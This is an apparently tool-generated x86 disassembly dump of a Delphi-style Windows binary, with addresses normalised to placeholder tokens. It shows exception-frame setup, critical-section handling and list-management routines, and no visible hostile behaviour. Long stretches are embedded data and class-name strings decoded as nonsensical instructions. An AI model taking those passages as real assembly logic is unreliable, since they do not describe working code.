mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4042d8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410ee4
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410fdd
lea eax [ ebp - 0xc ]
call sub_404050
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_40476c
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410fe4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410b60
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_41102c ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41115b ]
jmp [ eax * 4 + jump_table_4110c8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4111f0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4111dc
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_411230
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_411268
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4112a4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4056a4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411318
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41135e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411365
retn
mov eax rw-data
call sub_404050
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404acc
sub_411370
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411395
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41139c
retn
sub_411cb9
xchg ebp eax
sbb al 0x41
add [ ebx - 0x52ffbee4 ] ah
sbb al 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ecx 0x800411c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x1d340040 ] cl
inc ecx
add ch al
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x41 ] al
add [ eax + 0x1d ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1d ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
clc
sbb eax [ ecx ]
les esi [ eax + eax * 2 ]
add [ eax ] dl
dec ecx
inc ecx
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add [ eax + 0xe004149 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ch
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
clc
sbb eax [ ecx ]
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor al 0x40
add [ edx + esi ] ch
imul esi [ ebx + 0x74 ] 0x70746e65
sbb eax 0x15070041
push esp
dec ecx
outsb
je r-xdata
inc eax
sub al 0x32
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add ah bh
dec edx
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add [ eax + 0x4b ] ch
inc ecx
add [ eax + 0x4c ] cl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax + 0x4c ] bh
inc ecx
add [ eax + 0x4c ] dh
inc ecx
add ah al
dec edx
inc ecx
add [ edx ] al
add bh bh
push 0x4800414b
dec esp
imul esi [ ebx + 0x74 ] 0x34746e65
sbb eax 0x1c6c0041
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x1e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push ds
inc ecx
add [ esi ] dl
push ds
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_41212c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
and [ ecx + eax * 2 ] dl
sbb [ ebx + 0x41 ] dl
outsb
dec ecx
je r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x66600040 ] al
inc ecx
imul ebp [ esi + 0x67 ] 0x7473694c
inc eax
and al [ ecx ]
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax - 0x4bffbe9e ] al
bound eax [ ecx ]
mov eax 0xbc004162
bound eax [ ecx ]
add al 0x57
inc ecx
add [ eax ] dh
inc ecx
add [ esp + 0x65600041 ] cl
inc ecx
add [ eax + 0x5e ] dl
inc ecx
add [ ebp + 0x66100041 ] bl
inc ecx
add [ eax ] dh
inc ecx
add [ eax + 0x60 ] al
inc ecx
add [ eax + 0x52 ] ah
inc ecx
add ah bl
pushad
inc ecx
add [ ecx ] bl
inc ecx
add [ eax - 0x4fffbe9f ] cl
push esi
inc ecx
add [ eax ] bl
arpl [ ecx ] ax
inc esp
pop ecx
inc ecx
add [ eax ] bl
pop edx
inc ecx
add [ ebx + 0x41 ] dl
add [ ebx + 0x41 ] ah
add [ edx + ebx * 2 + 0x41 ] bh
add al dl
pop edx
inc ecx
add [ ebx + ebx * 2 + 0x41 ] bh
add [ ebx * 2 + 0x5d6c0041 ] dl
inc ecx
add [ eax ] al
pop esi
inc ecx
add [ eax + 0x60c00041 ] ah
inc ecx
add [ eax + 0x8004163 ] bh
bound eax [ ecx ]
enter 0x4165 0x0
fsub [ ebp + 0x41 ]
add [ ebx ] cl
push esp
push ebx
je r-xdata
push esp
inc ecx
add [ eax ] bl
push ebx
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cwde
and [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
and al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] ah
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax ] bl
inc ecx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al bl
pop edi
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax ] ah
add [ eax + 0x66 ] ah
popad
add [ esi + 0x66c40041 ] ch
inc ecx
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
inc ecx
add al ch
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
pushad
inc cx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al 0x21
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
mov esp 0x4123
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
and eax [ ecx ]
or [ eax ] al
add [ eax ] al
clc
and al [ ecx ]
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x6c ] bh
inc ecx
add [ eax + 0x66 ] ah
inc ecx
add [ edx + ebp * 2 + 0x6ab80041 ] ah
inc ecx
add [ eax + 0x6a ] bl
inc ecx
add [ eax + 0x6a ] ch
inc ecx
add [ edi + 0x41 ] ah
add [ eax + 0x6a ] bh
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add [ eax + 0x6a ] ch
inc ecx
add [ edi + 0x41 ] ah
add [ eax + 0x6a ] bh
inc ecx
add [ 0x6e614854 ] cl
pop eax
push 0x41
popad
insd
mov al 0x22
inc ecx
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
xor [ ecx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x41 ] cl
add [ eax ] dl
add [ eax ] al
add [ edx + 0x41 ] ah
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x66600040 ] al
inc ecx
add [ esi + 0x66c40041 ] ch
inc ecx
add [ esp + ebp * 2 + 0x2a900041 ] dh
inc eax
add ah ch
insb
inc ecx
add al ch
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
call 0xffffffffe0416630
je r-xdata
insb
push ebx
je r-xdata
outsb
jae r-xdata
inc ecx
add [ edx + ebp * 2 + 0x6ab80041 ] ah
inc ecx
add [ eax + 0x6a ] bl
inc ecx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x66600040 ] al
insd
fsub [ edx ]
inc ecx
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
popad
add [ ebp + 0x22b00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and al [ ecx ]
add al 0x0
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
insd
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add al ch
inc ecx
add al ah
add [ ebp + 0x23440040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] ah
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edx + 0x41 ] ah
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
pushad
inc cx
je r-xdata
outsd
jb r-xdata
insd
popad
insd
lodsb [ esi ]
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and al 0x41
add [ eax + eax ] dl
add [ eax ] al
in al 0x23
inc ecx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
insd
inc ecx
add [ eax + 0x66 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x66c40041 ] dh
inc ecx
add [ esp + ebp * 2 + 0x6e6c0041 ] dh
inc ecx
add ah ch
insb
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
add [ esi + 0x66c40041 ] ch
inc ecx
add [ esp + ebp * 2 + 0x70280041 ] dh
inc ecx
add ah ch
insb
inc ecx
add al ch
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
sub [ 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and eax 0x180041
add [ eax ] al
in al 0x23
inc ecx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al dh
outsd
inc ecx
add [ eax + 0x66 ] ah
inc ecx
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_412ce0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ea0
pop edi
pop esi
pop ebx
retn
sub_412d08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e84
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412d30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ea8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412e28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_414170
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034a8
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034a8
test al al
je r-xdata
sub_412e88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412e28
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412e28
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034a8
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412ef8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_414014
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_412f74
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
mov eax [ esi + 0x4 ]
call sub_403294
mov eax [ esi + 0x8 ]
call sub_403294
mov eax [ esi + 0xc ]
call sub_403294
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_412fb4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_414170
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031f8
test al al
jne r-xdata
sub_413014
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_414170
mov edx eax
mov eax ebp
call sub_4034a8
test al al
jne r-xdata
sub_413058
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4130f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042b4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412fb4
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_414014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130fa
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
sub_413118
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405044
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_413138
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_414170
mov edx edi
call sub_413118
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_414170
mov edx edi
call sub_413118
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_414060
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_413118
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_414060
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4131dc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_414170
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_413014
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_413228
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ef8
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414014
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41329c
push ebx
push esi
push edi
push ebp
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_414170
call sub_403294
inc edi
dec ebp
jne r-xdata
sub_4132f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_414170
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412e88
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_41333c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412fb4
mov edi eax
inc esi
dec ebx
